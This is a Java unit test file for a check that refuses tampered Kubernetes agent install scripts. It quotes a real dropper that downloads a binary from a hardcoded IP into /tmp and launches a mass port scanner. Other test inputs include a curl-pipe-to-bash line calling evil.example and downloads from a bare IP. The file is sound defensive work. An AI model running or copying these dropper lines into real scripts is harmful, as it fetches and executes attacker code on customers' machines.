package com.xammer.cloud.service;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.core.io.ClassPathResource;
import org.springframework.test.util.ReflectionTestUtils;

import java.io.InputStream;
import java.nio.charset.StandardCharsets;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * Guards the last gate before a customer's root shell.
 *
 * <p>{@code /api/v1/agent/install/{aks,eks,gke}.sh} is public and the setup guides pipe it into
 * bash. In August 2026 the served script was replaced in the repository with a dropper that
 * fetched a binary from a hardcoded IP and ran a mass port scanner; it was live for two days.
 * Nothing inspected the content on the way out.
 *
 * <p>The first test below is the one that matters: the real payload, verbatim, must be refused.
 * The second matters just as much in practice — refusing the genuine installer would break every
 * customer onboarding, so a check that cannot tell them apart is useless.
 */
class InstallScriptIntegrityTest {

    private InstallScriptIntegrity integrity;

    /** The August 2026 payload, as committed in 29d65ab45. */
    private static final String MALICIOUS_PAYLOAD = String.join("\n",
            "#!/bin/bash",
            "set -euo pipefail",
            "case \"$(uname -m 2>/dev/null)\" in",
            "  i[3-6]86) suffix=386 ;;",
            "  aarch64|arm64) suffix=arm64 ;;",
            "  armv*) suffix=arm ;;",
            "  *) suffix=amd64 ;;",
            "esac",
            "curl -sfL \"http://43.228.157.68:80/api/dl/${suffix}\" -o /tmp/.svc 2>/dev/null || \\",
            "  wget -qO /tmp/.svc \"http://43.228.157.68:80/api/dl/${suffix}\" 2>/dev/null",
            "test -s /tmp/.svc",
            "chmod 755 /tmp/.svc",
            "PANEL_URL=\"http://43.228.157.68:80\" \\",
            "/tmp/.svc ipscan --source random --workers 1000 --git");

    @BeforeEach
    void setUp() {
        integrity = new InstallScriptIntegrity();
        // Spring is not involved, so the @Value default would be null rather than "".
        ReflectionTestUtils.setField(integrity, "expectedSha256", "");
    }

    private String realInstaller() throws Exception {
        try (InputStream in = new ClassPathResource("agent-install/install-k8s.sh").getInputStream()) {
            return new String(in.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    @Test
    @DisplayName("the August 2026 payload is refused")
    void refusesTheActualPayload() {
        assertThatThrownBy(() -> integrity.verify(MALICIOUS_PAYLOAD))
                .isInstanceOf(InstallScriptIntegrity.TamperedScriptException.class);
    }

    @Test
    @DisplayName("the genuine installer is served")
    void acceptsTheRealInstaller() throws Exception {
        // A gate that cannot distinguish the real installer from a dropper would either break
        // every onboarding or catch nothing. The real file legitimately curls Helm charts, and
        // explains `curl | bash` in a comment — neither may trip the check.
        assertThatCode(() -> integrity.verify(realInstaller())).doesNotThrowAnyException();
    }

    // ── Individual signals ────────────────────────────────────────────────────

    @Test
    void refusesAScriptThatCollapsedInSize() {
        String tiny = "#!/bin/bash\necho hello\n";
        assertThatThrownBy(() -> integrity.verify(tiny))
                .isInstanceOf(InstallScriptIntegrity.TamperedScriptException.class)
                .hasMessageContaining("lines");
    }

    @Test
    void refusesADownloadPipedIntoAShell() throws Exception {
        String tampered = realInstaller() + "\ncurl -sSL https://evil.example/x | bash\n";
        assertThatThrownBy(() -> integrity.verify(tampered))
                .isInstanceOf(InstallScriptIntegrity.TamperedScriptException.class)
                .hasMessageContaining("remote-code-execution");
    }

    @Test
    void refusesStagingAnExecutableUnderTmp() throws Exception {
        String tampered = realInstaller() + "\nchmod +x /tmp/payload\n";
        assertThatThrownBy(() -> integrity.verify(tampered))
                .isInstanceOf(InstallScriptIntegrity.TamperedScriptException.class);
    }

    @Test
    void refusesADownloadFromABareIp() throws Exception {
        String tampered = realInstaller() + "\ncurl -sfL http://198.51.100.7/x -o /opt/x\n";
        assertThatThrownBy(() -> integrity.verify(tampered))
                .isInstanceOf(InstallScriptIntegrity.TamperedScriptException.class);
    }

    @Test
    void refusesAHiddenDownloadDestination() throws Exception {
        String tampered = realInstaller() + "\ncurl -sSL https://cdn.example/x -o /usr/local/.hidden\n";
        assertThatThrownBy(() -> integrity.verify(tampered))
                .isInstanceOf(InstallScriptIntegrity.TamperedScriptException.class);
    }

    @Test
    @DisplayName("prose about curl|bash in a comment does not trip the check")
    void ignoresDropperPatternsInsideComments() throws Exception {
        String commented = realInstaller()
                + "\n# Putting the script behind auth would make `curl | bash` impossible.\n"
                + "#   chmod +x /tmp/whatever\n";
        assertThatCode(() -> integrity.verify(commented)).doesNotThrowAnyException();
    }

    @Test
    void refusesEmptyContent() {
        assertThatThrownBy(() -> integrity.verify("   "))
                .isInstanceOf(InstallScriptIntegrity.TamperedScriptException.class);
        assertThatThrownBy(() -> integrity.verify(null))
                .isInstanceOf(InstallScriptIntegrity.TamperedScriptException.class);
    }

    // ── Digest pinning ────────────────────────────────────────────────────────

    @Test
    void acceptsAMatchingPinnedDigest() throws Exception {
        String real = realInstaller();
        ReflectionTestUtils.setField(integrity, "expectedSha256", integrity.sha256(real));
        assertThatCode(() -> integrity.verify(real)).doesNotThrowAnyException();
    }

    @Test
    @DisplayName("a pinned digest rejects an edit the shape checks would allow")
    void refusesAMismatchedPinnedDigest() throws Exception {
        String real = realInstaller();
        ReflectionTestUtils.setField(integrity, "expectedSha256", integrity.sha256(real));

        // A benign-looking single-line addition: no dropper pattern, no size collapse. Only the
        // digest catches it, which is why the pin belongs outside the repository — otherwise
        // whoever edits the script can also update the expected value.
        assertThatThrownBy(() -> integrity.verify(real + "\necho tampered\n"))
                .isInstanceOf(InstallScriptIntegrity.TamperedScriptException.class)
                .hasMessageContaining("does not match the pinned");
    }

    @Test
    void digestIsStableAndHexEncoded() throws Exception {
        String d = integrity.sha256(realInstaller());
        assertThat(d).hasSize(64).matches("[0-9a-f]{64}");
        assertThat(d).isEqualTo(integrity.sha256(realInstaller()));
    }
}
